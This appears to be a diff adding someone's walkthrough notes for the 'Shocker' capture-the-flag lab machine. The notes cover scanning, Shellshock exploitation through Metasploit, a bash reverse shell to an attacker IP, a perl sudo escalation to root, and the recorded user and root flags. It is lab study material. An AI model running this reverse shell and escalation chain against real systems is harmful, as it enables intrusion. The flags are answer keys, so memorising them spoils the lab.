@@ -1,0 +1,161 @@
+Machine: Shocker
+TARGET: 10.129.83.111
+
+
+Task 1
+
+How many TCP ports are listening on Shocker?
+
+nmap -sV -sC -oA nmap/Shocker 10.129.83.111
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+> 2
+
+
+Task 2
+
+What is the name of the directory 
+available on the webserver that is a 
+standard name known for running 
+scripts via the Common Gateway Interface?
+
+gobuster dir -u http://10.129.83.111/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
+/.hta                 (Status: 403) [Size: 292]
+/.hta.php             (Status: 403) [Size: 296]
+/.hta.txt             (Status: 403) [Size: 296]
+/.htpasswd.php        (Status: 403) [Size: 301]
+/.htaccess.txt        (Status: 403) [Size: 301]
+/.htaccess            (Status: 403) [Size: 297]
+/.htaccess.php        (Status: 403) [Size: 301]
+/.htpasswd            (Status: 403) [Size: 297]
+/.htpasswd.txt        (Status: 403) [Size: 301]
+/cgi-bin/             (Status: 403) [Size: 296]
+/index.html           (Status: 200) [Size: 137]
+/server-status        (Status: 403) [Size: 301]
+
+> cgi-bin
+
+Task 3
+
+What is the name of the script in the cgi-bin directory?
+
+gobuster dir -u http://10.129.83.111/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl
+
+
+/.hta.pl              (Status: 403) [Size: 303]
+/.hta                 (Status: 403) [Size: 300]
+/.hta.cgi             (Status: 403) [Size: 304]
+/.hta.sh              (Status: 403) [Size: 303]
+/.htaccess            (Status: 403) [Size: 305]
+/.htaccess.pl         (Status: 403) [Size: 308]
+/.htaccess.sh         (Status: 403) [Size: 308]
+/.htaccess.cgi        (Status: 403) [Size: 309]
+/.htpasswd.pl         (Status: 403) [Size: 308]
+/.htpasswd            (Status: 403) [Size: 305]
+/.htpasswd.sh         (Status: 403) [Size: 308]
+/.htpasswd.cgi        (Status: 403) [Size: 309]
+/user.sh              (Status: 200) [Size: 119]
+
+> user.sh
+
+Task 4
+
+Optional question: The output from user.sh matches the output from what standard Linux command?
+
+
+
+Task 5
+
+What 2014 CVE ID describes a remote code execution vulnerability in Bash when invoked through Apache CGI?
+
+google search: Apache CGI 2014 CVe RCE
+
+> CVE-2014-6271
+
+
+
+
+
+
+
+msfconsole
+search Shellshock
+
+
+   #   Name                                               Disclosure Date  Rank       Check  Description
+   -   ----                                               ---------------  ----       -----  -----------
+   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+   2     \_ target: Linux x86                             .                .          .      .
+   3     \_ target: Linux x86_64                          .                .          .      .
+
+use 1
+
+options
+set LHOST 10.10.14.156
+set TARGETURI http://10.129.83.111/cgi-bin/user.sh
+set RHOSTS 10.129.83.111
+run
+
+meterpreter 셸 획득
+
+
+
+
+
+Submit User Flag
+
+Submit the flag located in the shelly user's home directory.
+
+cat /home/shelly/user.txt
+> 90c5a327907f4c1b29b25e275757a962
+
+
+
+Task 8
+
+Which binary can the shelly user can run as root on Shocker?
+
+shell
+bash -c 'exec bash -i &>/dev/tcp/10.10.14.156/8888 <&1'
+
+nc -nlvp 8888
+
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+
+> perl
+
+
+
+Submit Root Flag
+
+Submit the flag located in root's home directory.
+
+sudo perl -e 'exec "/bin/sh";'
+
+> bcbcf1bca3a6d0af2a7c84bbda8501e9
+
+
+
+
+
+
+
+
+
